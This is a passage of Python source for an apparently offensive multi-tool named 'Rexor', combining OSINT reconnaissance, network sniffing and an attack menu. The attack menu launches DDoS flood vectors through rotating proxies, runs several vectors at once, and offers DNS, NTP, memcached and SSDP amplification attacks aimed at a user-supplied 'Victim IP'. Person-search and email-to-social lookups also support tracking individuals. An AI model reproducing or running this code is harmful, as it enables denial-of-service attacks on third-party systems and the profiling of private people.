                ce.print(f"  {port} ({svc}) - web, check for vulns")
            elif port == 21:
                ce.print(f"  {port} (FTP) - check anonymous login")
            elif port in [3306, 5432, 27017, 6379, 1433, 1521]:
                ce.print(f"  {port} ({svc}) - database, ensure not exposed")
            elif port in [2375, 6443]:
                ce.print(f"  {port} ({svc}) - container API, common misconfig target")
            else:
                ce.print(f"  {port} ({svc})")
        if export:
            self._export_ports(ip, open_ports, banners, export)

    def _export_ports(self, ip, open_ports, banners, fmt):
        try:
            if fmt == "json":
                path = RESULTS_DIR / f"ports_{ip.replace('.','_')}_{int(time.time())}.json"
                path.write_text(json.dumps({
                    "target": ip,
                    "open_ports": [{"port": p, "service": s, "banner": banners.get(p, "")} for p, s in open_ports],
                    "timestamp": datetime.now().isoformat(),
                }, indent=2))
            else:
                path = RESULTS_DIR / f"ports_{ip.replace('.','_')}_{int(time.time())}.csv"
                with open(path, "w", newline="") as f:
                    w = csv.writer(f)
                    w.writerow(["port", "service", "banner"])
                    for p, s in open_ports:
                        w.writerow([p, s, banners.get(p, "")])
            ce.print(f"\nExported: {path}")
        except Exception as e:
            ce.print(f"[!] Export failed: {e}")

    def _scan_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            r = s.connect_ex((ip, port))
            s.close()
            return r == 0
        except Exception:
            return False

    def _grab_banner(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            if port in (80, 8080, 8000):
                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            elif port in (443, 8443):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=ip)
                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            data = s.recv(512)
            s.close()
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def tls_cert_info(self, host, port=443):
        ce.print(f"\nTLS certificate: {host}:{port}")
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ss:
                    cert = ss.getpeercert()
                    if cert:
                        table = Table(title="TLS cert", border_style="red", box=box.HEAVY)
                        table.add_column("FIELD", style="red")
                        table.add_column("VALUE", style="red")
                        for k in ("subject", "issuer", "version", "serialNumber", "notBefore", "notAfter"):
                            v = cert.get(k)
                            if v:
                                table.add_row(k, str(v)[:120])
                        ce.print(table)
                        san = cert.get("subjectAltName", [])
                        if san:
                            ce.print(f"\nSANs ({len(san)}):")
                            for t, v in san[:30]:
                                ce.print(f"  {t}: {v}")
        except Exception as e:
            ce.print(f"[!] TLS info failed: {e}")

    def robots_sitemap(self, domain):
        ce.print(f"\nrobots.txt / sitemap.xml: {domain}")
        for path in ("/robots.txt", "/sitemap.xml"):
            url = f"https://{domain}{path}"
            try:
                resp = self._request("GET", url, timeout=8)
                if resp.status_code == 200:
                    ce.print(f"\n[bold green]{url}[/bold green]")
                    ce.print(resp.text[:3000])
                else:
                    ce.print(f"\n{url}: status {resp.status_code}")
            except Exception as e:
                ce.print(f"\n{url}: {e}")

    def open_directory_check(self, domain):
        ce.print(f"\nOpen directory check: {domain}")
        common_dirs = ["/uploads/", "/backup/", "/backups/", "/files/", "/data/", "/logs/", "/tmp/", "/old/", "/.git/", "/.env", "/.svn/", "/admin/", "/private/", "/config/"]
        for d in common_dirs:
            url = f"https://{domain}{d}"
            try:
                resp = self._request("GET", url, timeout=5)
                if resp.status_code == 200:
                    if "Index of /" in resp.text or "Directory listing" in resp.text:
                        ce.print(f"[bold green]  OPEN DIR: {url}[/bold green]")
                    elif d in ("/.env", "/.git/"):
                        ce.print(f"[bold red]  SENSITIVE: {url} (status {resp.status_code})[/bold red]")
                elif resp.status_code in (401, 403):
                    ce.print(f"  {url} - protected ({resp.status_code})")
            except Exception:
                pass

    def subdomain_takeover_check(self, domain):
        ce.print(f"\nSubdomain takeover heuristic: {domain}")
        if not DNS_AVAILABLE:
            ce.print("[!] dnspython not installed")
            return
        takeover_sigs = {
            "github.io": "There isn't a GitHub Pages site here",
            "herokuapp.com": "No such app",
            "s3.amazonaws.com": "NoSuchBucket",
            "cloudfront.net": "Bad request",
            "azurewebsites.net": "Error 404",
            "trafficmanager.net": "Not Found",
            "fastly.net": "Fastly error: unknown domain",
            "shopify.com": "Sorry, this shop is currently unavailable",
            "wordpress.com": "Do you want to register",
            "surge.sh": "project not found",
        }
        for sub in SUBDOMAIN_WORDLIST:
            host = f"{sub}.{domain}"
            try:
                answers = dns.resolver.resolve(host, "CNAME")
                for rdata in answers:
                    target = str(rdata).strip(".")
                    for sig, msg in takeover_sigs.items():
                        if sig in target:
                            ce.print(f"[bold red]  POTENTIAL TAKEOVER: {host} -> {target}[/bold red]")
                            break
                    else:
                        ce.print(f"  {host} -> {target}")
            except Exception:
                pass

    def social_media_deep(self, username):
        ce.print(f"\nDeep social search: {username}")
        extra_platforms = {
            "periscope": f"https://www.pscp.tv/{username}",
            "dlive": f"https://dlive.tv/{username}",
            "odysee": f"https://odysee.com/@{username}",
            "bitchute": f"https://www.bitchute.com/channel/{username}",
            "rumble": f"https://rumble.com/user/{username}",
            "minds": f"https://www.minds.com/{username}",
            "gab": f"https://gab.com/{username}",
            "mewe": f"https://mewe.com/i/{username}",
            "threads": f"https://www.threads.net/@{username}",
            "truthsocial": f"https://truthsocial.com/@{username}",
            "gettr": f"https://gettr.com/user/{username}",
        }
        found_count = 0
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self._check_profile, p, url): p for p, url in extra_platforms.items()}
            for f in as_completed(futures):
                p = futures[f]
                try:
                    result = f.result()
                    if result:
                        _, exists, url = result
                        if exists:
                            found_count += 1
                            ce.print(f"  [bold green]{p}[/bold green]: {url}")
                except Exception:
                    pass
        ce.print(f"\nFound on {found_count} additional platforms")

    def email_to_social(self, email):
        ce.print(f"\nEmail to social: {email}")
        username = email.split("@")[0]
        ce.print(f"Username: {username}")
        self.username_search(username)

    def reverse_image_search_prep(self, image_url):
        ce.print(f"\nReverse image search links:")
        encoded = urllib.parse.quote(image_url, safe="")
        ce.print(f"  Google Lens: https://lens.google.com/uploadbyurl?url={encoded}")
        ce.print(f"  Yandex: https://yandex.com/images/search?rpt=imageview&url={encoded}")
        ce.print(f"  TinEye: https://tineye.com/search?url={encoded}")
        ce.print(f"  Bing: https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{encoded}")

    def darknet_search(self, query):
        ce.print(f"\nDarknet proxies:")
        ce.print(f"  Ahmia: https://ahmia.fi/search/?q={query}")
        ce.print(f"  DarkSearch: https://darksearch.io/search?query={query}")
        ce.print(f"  OnionLand: https://onionlandsearchengine.com/search?q={query}")

    def crypto_address_check(self, address):
        ce.print(f"\nCrypto address: {address[:20]}...")
        low = address.lower()
        if low.startswith("bc1") or low.startswith("1") or low.startswith("3"):
            ce.print(f"  Type: Bitcoin")
            ce.print(f"  blockchain.com/explorer/addresses/btc/{address}")
            ce.print(f"  blockchair.com/bitcoin/address/{address}")
        elif low.startswith("0x"):
            ce.print(f"  Type: Ethereum/EVM")
            ce.print(f"  etherscan.io/address/{address}")
            ce.print(f"  blockchair.com/ethereum/address/{address}")
            ce.print(f"  debank.com/profile/{address}")
        elif low.startswith(("xpub", "ypub", "zpub")):
            ce.print(f"  Type: BTC extended public key")
            ce.print(f"  blockchair.com/bitcoin/xpub/{address}")
        else:
            ce.print(f"  Unknown - blockchair.com/search?q={address}")

    def vehicle_lookup(self, vin_or_plate):
        ce.print(f"\nVehicle lookup:")
        ce.print(f"  NHTSA VIN decoder: https://vpic.nhtsa.dot.gov/decoder/")
        ce.print(f"  NICB VINCheck: https://www.nicb.org/vincheck")
        ce.print(f"  AutoCheck: https://www.autocheck.com/")

    def person_search(self, name, location=""):
        ce.print(f"\nPerson search: {name} {location}")
        enc = urllib.parse.quote(name)
        ce.print(f"  Whitepages: https://www.whitepages.com/name/{enc}")
        ce.print(f"  TruePeopleSearch: https://www.truepeoplesearch.com/results?name={enc}")
        ce.print(f"  FastPeopleSearch: https://www.fastpeoplesearch.com/name/{enc}")
        ce.print(f"  That's Them: https://thatsthem.com/name/{enc}")

    def company_osint(self, company):
        ce.print(f"\nCompany OSINT: {company}")
        ce.print(f"  LinkedIn: https://www.linkedin.com/company/{company}")
        ce.print(f"  Crunchbase: https://www.crunchbase.com/organization/{company}")
        ce.print(f"  OpenCorporates: https://opencorporates.com/companies?q={company}")
        ce.print(f"  SEC EDGAR: https://www.sec.gov/cgi-bin/browse-edgar?company={company}")


class RexorSniffer:
    def scan_wifi(self):
        ce.print(f"\nWiFi scanner")
        try:
            if sys.platform == "linux":
                r = subprocess.run(
                    "nmcli -t -f SSID,BSSID,CHAN,SIGNAL,SECURITY dev wifi list",
                    shell=True, capture_output=True, text=True, timeout=30,
                )
                nets = []
                for line in r.stdout.strip().split("\n"):
                    p = line.split(":")
                    if len(p) >= 5:
                        nets.append({"ssid": p[0] or "[HIDDEN]", "bssid": p[1], "ch": p[2], "sig": p[3], "sec": p[4]})
                if not nets:
                    ce.print("[!] No networks found")
                    return
                table = Table(title="WiFi networks", border_style="red", box=box.HEAVY)
                for c in ["SSID", "BSSID", "CH", "SIGNAL", "SECURITY"]:
                    table.add_column(c, style="red")
                for n in sorted(nets, key=lambda x: x["sig"], reverse=True):
                    sig_int = int(n["sig"]) if n["sig"].isdigit() else 0
                    bar = "#" * min(sig_int // 10, 10)
                    table.add_row(
                        f"{n['ssid'][:30]}",
                        f"{n['bssid']}",
                        f"{n['ch']}",
                        f"{bar} {n['sig']}%",
                        f"{n['sec']}",
                    )
                ce.print(table)
                ce.print(f"\n{len(nets)} networks")
            elif sys.platform == "darwin":
                r = subprocess.run(
                    "system_profiler SPAirPortDataType",
                    shell=True, capture_output=True, text=True, timeout=30,
                )
                ce.print(r.stdout)
            elif sys.platform == "win32":
                r = subprocess.run("netsh wlan show networks mode=Bssid", shell=True, capture_output=True, text=True, timeout=30)
                ce.print(r.stdout)
        except Exception as e:
            ce.print(f"[!] Error: {e}")

    def packet_sniffer(self, interface=None, count=100):
        ce.print(f"\nPacket sniffer - needs root + scapy")
        if not SCAPY_AVAILABLE:
            ce.print("[!] scapy not installed (pip install scapy)")
            return
        try:
            from scapy.all import sniff, IP
            ce.print(f"Capturing {count} packets...")
            packets = sniff(iface=interface, count=count, timeout=60)
            ce.print(f"\nCaptured {len(packets)} packets")
            ip_count = {}
            for pkt in packets:
                if pkt.haslayer(IP):
                    ip_count[pkt[IP].src] = ip_count.get(pkt[IP].src, 0) + 1
                    ip_count[pkt[IP].dst] = ip_count.get(pkt[IP].dst, 0) + 1
            top = sorted(ip_count.items(), key=lambda x: x[1], reverse=True)[:10]
            if top:
                ce.print(f"\nTop talkers:")
                for ip, cnt in top:
                    ce.print(f"  {ip} - {cnt} packets")
        except PermissionError:
            ce.print("[!] Need root/admin")
        except Exception as e:
            ce.print(f"[!] {e}")

    def network_scanner(self, subnet):
        ce.print(f"\nNetwork scan: {subnet}")
        if not SCAPY_AVAILABLE:
            ce.print("[!] scapy not installed")
            return
        try:
            from scapy.all import arping
            ans, unans = arping(subnet, timeout=3, verbose=False)
            if ans:
                table = Table(title="Discovered hosts", border_style="red", box=box.HEAVY)
                table.add_column("IP", style="red")
                table.add_column("MAC", style="red")
                table.add_column("HOSTNAME", style="red")
                for sent, recv in ans:
                    ip = recv.psrc
                    mac = recv.hwsrc
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except Exception:
                        hostname = "Unknown"
                    table.add_row(f"{ip}", f"{mac}", f"{hostname}")
                ce.print(table)
                ce.print(f"\n{len(ans)} hosts")
            else:
                ce.print("[!] No hosts responded")
        except PermissionError:
            ce.print("[!] Need root/admin")
        except Exception as e:
            ce.print(f"[!] {e}")

    def arp_spoof_detect(self):
        ce.print(f"\nARP spoof detector - needs scapy + root")
        if not SCAPY_AVAILABLE:
            ce.print("[!] scapy not installed")
            return
        try:
            from scapy.all import sniff, ARP
            known = {}
            alerts = [0]

            def detect(pkt):
                if pkt.haslayer(ARP) and pkt[ARP].op == 2:
                    ip = pkt[ARP].psrc
                    mac = pkt[ARP].hwsrc
                    if ip in known and known[ip] != mac:
                        ce.print(f"[!] ARP spoof: {ip} was {known[ip]}, now {mac}")
                        alerts[0] += 1
                    known[ip] = mac

            ce.print("Listening 30s...")
            sniff(prn=detect, filter="arp", timeout=30, store=False)
            if alerts[0] == 0:
                ce.print("No ARP spoofing detected")
            else:
                ce.print(f"{alerts[0]} alerts")
        except PermissionError:
            ce.print("[!] Need root/admin")
        except Exception as e:
            ce.print(f"[!] {e}")

    def dns_sniffer(self):
        ce.print(f"\nDNS sniffer - needs scapy + root")
        if not SCAPY_AVAILABLE:
            ce.print("[!] scapy not installed")
            return
        try:
            from scapy.all import sniff, DNSQR, IP
            queries = set()

            def dns_cb(pkt):
                if pkt.haslayer(DNSQR):
                    qname = pkt[DNSQR].qname.decode()
                    if qname not in queries:
                        queries.add(qname)
                        ce.print(f"DNS: {qname:<50} from {pkt[IP].src}")

            ce.print("Capturing 30s...")
            sniff(prn=dns_cb, filter="udp port 53", timeout=30, store=False)
            ce.print(f"\n{len(queries)} unique queries")
        except PermissionError:
            ce.print("[!] Need root/admin")
        except Exception as e:
            ce.print(f"[!] {e}")


class Rexor:
    def __init__(self):
        self.config = Config()
        self.proxy_manager = ProxyManager(
            proxy_file=self.config.get("proxy_file") or None,
            rotate=self.config.get("proxy_rotate"),
            health_check_interval=self.config.get("proxy_health_check"),
        )
        if self.proxy_manager.pool:
            self.proxy_manager.start_health_loop()
        self.floods = RexorFloods(proxy_manager=self.proxy_manager, config=self.config)
        self.osint = RexorOSINT(proxy_manager=self.proxy_manager, config=self.config)
        self.sniffer = RexorSniffer()
        self.command_history = []

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")

    def show_banner(self):
        self.clear_screen()
        ce.print(BANNER)
        ce.print("[bold red]  RE: X O R  |  OSINT  |  NETWORK  |  RED TEAM[/bold red]")
        ce.print(f"[bold red]  v{VERSION}[/bold red]")
        if self.proxy_manager.pool:
            s = self.proxy_manager.stats()
            ce.print(f"[bold red]  proxies: {s['available']}/{s['total']} available[/bold red]")
        ce.print("")

    def load_proxies_menu(self):
        self.show_banner()
        ce.print("Load proxies")
        ce.print("Format: ip:port  or  user:pass@ip:port  or  socks5://user:pass@ip:port\n")
        path = input(Fore.RED + "Proxy file path: " + Style.RESET_ALL).strip()
        if not path:
            return
        n = self.proxy_manager.load_from_file(path)
        if n > 0:
            self.config.set("proxy_file", path)
            ce.print(f"Loaded {n} proxies")
            self.proxy_manager.start_health_loop()
            ce.print("Health check running in background...")
        else:
            ce.print("[!] No proxies loaded")
        input(Fore.RED + "Press Enter..." + Style.RESET_ALL)

    def proxy_stats_menu(self):
        self.show_banner()
        s = self.proxy_manager.stats()
        if s["total"] == 0:
            ce.print("No proxies loaded")
        else:
            table = Table(title="Proxy pool", border_style="red", box=box.HEAVY)
            table.add_column("METRIC", style="red")
            table.add_column("VALUE", style="red")
            table.add_row("Total", f"{s['total']}")
            table.add_row("Available", f"{s['available']}")
            table.add_row("Disabled", f"{s['disabled']}")
            table.add_row("Avg latency", f"{s['avg_latency']:.3f}s")
            ce.print(table)
        input(Fore.RED + "Press Enter..." + Style.RESET_ALL)

    def api_keys_menu(self):
        self.show_banner()
        ce.print("API keys")
        ce.print("Stored in ~/.rexor/config.toml\n")
        ce.print(f"Shodan: {self.config.get('shodan_api_key') or '(not set)'}")
        ce.print(f"VirusTotal: {self.config.get('virustotal_api_key') or '(not set)'}")
        ce.print(f"HIBP: {self.config.get('hibp_api_key') or '(not set)'}\n")
        ce.print("1. Set Shodan key")
        ce.print("2. Set VirusTotal key")
        ce.print("3. Set HIBP key")
        ce.print("0. Back")
        choice = input(Fore.RED + "> " + Style.RESET_ALL).strip()
        if choice == "1":
            self.config.set("shodan_api_key", input(Fore.RED + "Shodan key: " + Style.RESET_ALL).strip())
        elif choice == "2":
            self.config.set("virustotal_api_key", input(Fore.RED + "VT key: " + Style.RESET_ALL).strip())
        elif choice == "3":
            self.config.set("hibp_api_key", input(Fore.RED + "HIBP key: " + Style.RESET_ALL).strip())

    def run(self):
        while True:
            self.show_banner()
            ce.print("""[bold red]
Rexor {
    "1": "Attacks (26 methods)",
    "2": "OSINT (24 options)",
    "3": "Sniffer (5 options)",
    "4": "Network scanner",
    "5": "WiFi scanner",
    "6": "Load proxies",
    "7": "Proxy stats",
    "8": "API keys",
    "help": "Show commands",
    "0": "Exit"
}
[/bold red]""")
            try:
                user = input(Fore.RED + "REXOR > " + Style.RESET_ALL).strip().lower()
            except (EOFError, KeyboardInterrupt):
                ce.print("\nExiting...")
                break
            self.command_history.append(user)
            if user == "1":
                self.attacks_menu()
            elif user == "2":
                self.osint_menu()
            elif user == "3":
                self.sniffer_menu()
            elif user == "4":
                subnet = input(Fore.RED + "Subnet (e.g. 192.168.1.0/24): " + Style.RESET_ALL).strip()
                if subnet:
                    self.sniffer.network_scanner(subnet)
                input(Fore.RED + "Press Enter..." + Style.RESET_ALL)
            elif user == "5":
                self.sniffer.scan_wifi()
                input(Fore.RED + "Press Enter..." + Style.RESET_ALL)
            elif user == "6":
                self.load_proxies_menu()
            elif user == "7":
                self.proxy_stats_menu()
            elif user == "8":
                self.api_keys_menu()
            elif user == "help":
                ce.print("""[bold red]
Commands:
  1  Attacks
  2  OSINT
  3  Sniffer
  4  Network scan
  5  WiFi scan
  6  Load proxies
  7  Proxy stats
  8  API keys
  0  Exit
[/bold red]""")
                input(Fore.RED + "Press Enter..." + Style.RESET_ALL)
            elif user in ("0", "exit", "quit"):
                break
            else:
                ce.print("[!] Unknown command")
                time.sleep(1)

    def attacks_menu(self):
        self.show_banner()
        if not SCAPY_AVAILABLE:
            ce.print("[!] scapy not installed - raw attacks will fall back to connection floods\n")
        menu_lines = ["Rexor {", '    "Attacks": {']
        for k, (m, name) in ATTACK_MENU.items():
            if k == "0":
                continue
            menu_lines.append(f'        "{k}": "{name}",')
        menu_lines.append('        "0": "Back"')
        menu_lines.append("    }")
        menu_lines.append("}")
        ce.print("[bold red]" + "\n".join(menu_lines) + "[/bold red]")
        user = input(Fore.RED + "ATTACK > " + Style.RESET_ALL).strip()
        if user == "0":
            return
        if user not in ATTACK_MENU:
            return
        method, name = ATTACK_MENU[user]
        if method == "back":
            return
        if method == "multi":
            ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL).strip()
            port = int(input(Fore.RED + "Port: " + Style.RESET_ALL).strip() or "80")
            vectors_input = input(Fore.RED + "Vectors (comma separated): " + Style.RESET_ALL).strip()
            vectors = [v.strip().lower() for v in vectors_input.split(",") if v.strip()]
            floods = []
            for v in vectors:
                f = RexorFloods(proxy_manager=self.proxy_manager, config=self.config)
                floods.append((v, f))
                threading.Thread(target=f.ddos, args=(v, ip, port, 25, 10), daemon=True).start()
                ce.print(f"Started {v.upper()}")
            ce.print(f"Running {len(floods)} vectors. Ctrl+C to stop.")
            try:
                while any(f.running for _, f in floods):
                    time.sleep(1)
            except KeyboardInterrupt:
                for _, f in floods:
                    f.stop()
                ce.print("\n[!] All stopped")
            input(Fore.RED + "Press Enter..." + Style.RESET_ALL)
            return
        if method == "dryrun":
            method = input(Fore.RED + "Method to validate: " + Style.RESET_ALL).strip().lower()
            ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL).strip()
            port = int(input(Fore.RED + "Port: " + Style.RESET_ALL).strip() or "80")
            self.floods.dry_run(method, ip, port)
            input(Fore.RED + "Press Enter..." + Style.RESET_ALL)
            return
        ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL).strip()
        port = int(input(Fore.RED + "Port: " + Style.RESET_ALL).strip() or "80")
        sockets = int(input(Fore.RED + "Sockets: " + Style.RESET_ALL).strip() or "50")
        size = int(input(Fore.RED + "Packet size: " + Style.RESET_ALL).strip() or "1024")
        path = input(Fore.RED + "Path (blank=/): " + Style.RESET_ALL).strip() or "/"
        use_ssl = method in ("https", "range", "ws") or (method in ("http",) and port == 443)
        extra = ""
        victim = ""
        domain = ""
        if method in ("dnsamp", "ntpamp", "memamp", "ssdp"):
            victim = input(Fore.RED + "Victim IP: " + Style.RESET_ALL).strip()
            extra = input(Fore.RED + "Amp server (blank for default): " + Style.RESET_ALL).strip()
        if method == "subspray":
            domain = input(Fore.RED + "Domain (for Host headers): " + Style.RESET_ALL).strip()
        self.floods.ddos(method, ip, port, 100, sockets, size, path=path, use_ssl=use_ssl,
                         extra=extra, victim=victim, domain=domain)
        input(Fore.RED + "Press Enter..." + Style.RESET_ALL)

    def osint_menu(self):
        self.show_banner()
        ce.print("""[bold red]
Rexor {
    "OSINT": {
        "1": "Username search",
        "2": "Email OSINT",
        "3": "Phone OSINT",
        "4": "IP geolocation",
        "5": "ASN lookup",
        "6": "DNS OSINT (all record types)",
        "7": "DNS zone transfer",
        "8": "Domain OSINT (WHOIS + subdomains + CT)",
        "9": "Subdomain takeover heuristic",
        "10": "Port scanner",
        "11": "TLS certificate info",
        "12": "robots.txt / sitemap.xml",
        "13": "Open directory check",
        "14": "security.txt",
        "15": "URLScan.io lookup",
        "16": "VirusTotal lookup",
        "17": "Shodan lookup",
        "18": "GitHub user recon",
        "19": "S3 bucket check",
        "20": "Google dorks",
        "21": "Reverse DNS sweep",
        "22": "Crypto address",
        "23": "Person search",
        "24": "Company OSINT"
    },
    "0": "Back"
}
[/bold red]""")
        user = input(Fore.RED + "OSINT > " + Style.RESET_ALL).strip()
        if user == "1":
            u = input(Fore.RED + "Username: " + Style.RESET_ALL).strip()
            if u:
                self.osint.username_search(u)
        elif user == "2":
            e = input(Fore.RED + "Email: " + Style.RESET_ALL).strip()
            if e:
                self.osint.email_osint(e)
        elif user == "3":
            p = input(Fore.RED + "Phone: " + Style.RESET_ALL).strip()
            if p:
                self.osint.phone_osint(p)
        elif user == "4":
            i = input(Fore.RED + "IP: " + Style.RESET_ALL).strip()
            if i:
                self.osint.ip_geolocation(i)
        elif user == "5":
            q = input(Fore.RED + "ASN / org / IP: " + Style.RESET_ALL).strip()
            if q:
                self.osint.asn_lookup(q)
        elif user == "6":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.dns_osint(d)
        elif user == "7":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.dns_zone_transfer(d)
        elif user == "8":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.domain_osint(d)
        elif user == "9":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.subdomain_takeover_check(d)
        elif user == "10":
            i = input(Fore.RED + "Target IP: " + Style.RESET_ALL).strip()
            mode = input(Fore.RED + "Mode [common/top1000/all] (default=common): " + Style.RESET_ALL).strip() or "common"
            export = input(Fore.RED + "Export [json/csv/none] (default=none): " + Style.RESET_ALL).strip() or None
            if i:
                self.osint.port_scanner(i, mode=mode, export=export)
        elif user == "11":
            h = input(Fore.RED + "Host: " + Style.RESET_ALL).strip()
            if h:
                self.osint.tls_cert_info(h)
        elif user == "12":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.robots_sitemap(d)
        elif user == "13":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.open_directory_check(d)
        elif user == "14":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.security_txt(d)
        elif user == "15":
            t = input(Fore.RED + "Domain or IP: " + Style.RESET_ALL).strip()
            if t:
                self.osint.urlscan_lookup(t)
        elif user == "16":
            t = input(Fore.RED + "Domain or IP: " + Style.RESET_ALL).strip()
            if t:
                self.osint.virustotal_lookup(t)
        elif user == "17":
            t = input(Fore.RED + "IP: " + Style.RESET_ALL).strip()
            if t:
                self.osint.shodan_lookup(t)
        elif user == "18":
            u = input(Fore.RED + "GitHub username: " + Style.RESET_ALL).strip()
            if u:
                self.osint.github_user(u)
        elif user == "19":
            b = input(Fore.RED + "Bucket name: " + Style.RESET_ALL).strip()
            if b:
                self.osint.s3_bucket_check(b)
        elif user == "20":
            d = input(Fore.RED + "Domain: " + Style.RESET_ALL).strip()
            if d:
                self.osint.google_dorks(d)
        elif user == "21":
            c = input(Fore.RED + "CIDR (e.g. 192.168.1.0/24): " + Style.RESET_ALL).strip()
            if c:
                self.osint.reverse_dns_sweep(c)
        elif user == "22":
            a = input(Fore.RED + "Crypto address: " + Style.RESET_ALL).strip()
            if a:
                self.osint.crypto_address_check(a)
        elif user == "23":
            n = input(Fore.RED + "Full name: " + Style.RESET_ALL).strip()
            loc = input(Fore.RED + "Location (optional): " + Style.RESET_ALL).strip()
            if n:
                self.osint.person_search(n, loc)
        elif user == "24":
            c = input(Fore.RED + "Company: " + Style.RESET_ALL).strip()
            if c:
                self.osint.company_osint(c)
        elif user == "0":
            return
        input(Fore.RED + "Press Enter..." + Style.RESET_ALL)

    def sniffer_menu(self):
        self.show_banner()
        ce.print("""[bold red]
Rexor {
    "Sniffer": {
        "1": "Packet sniffer",
        "2": "WiFi scanner",
        "3": "Network scanner",
        "4": "ARP spoof detection",
        "5": "DNS sniffer"
    },
    "0": "Back"
}
[/bold red]""")
        user = input(Fore.RED + "SNIFFER > " + Style.RESET_ALL).strip()
        if user == "1":
            iface = input(Fore.RED + "Interface (blank=default): " + Style.RESET_ALL).strip() or None
            self.sniffer.packet_sniffer(iface)
        elif user == "2":
            self.sniffer.scan_wifi()
        elif user == "3":
            subnet = input(Fore.RED + "Subnet: " + Style.RESET_ALL).strip()
            if subnet:
                self.sniffer.network_scanner(subnet)
        elif user == "4":
            self.sniffer.arp_spoof_detect()
        elif user == "5":
            self.sniffer.dns_sniffer()
        elif user == "0":
            return
        input(Fore.RED + "Press Enter..." + Style.RESET_ALL)


if __name__ == "__main__":
    try:
        app = Rexor()
        app.run()
    except KeyboardInterrupt:
        ce.print("\nRexor terminated")
    except Exception as e:
        ce.print(f"\nUnexpected error: {e}")
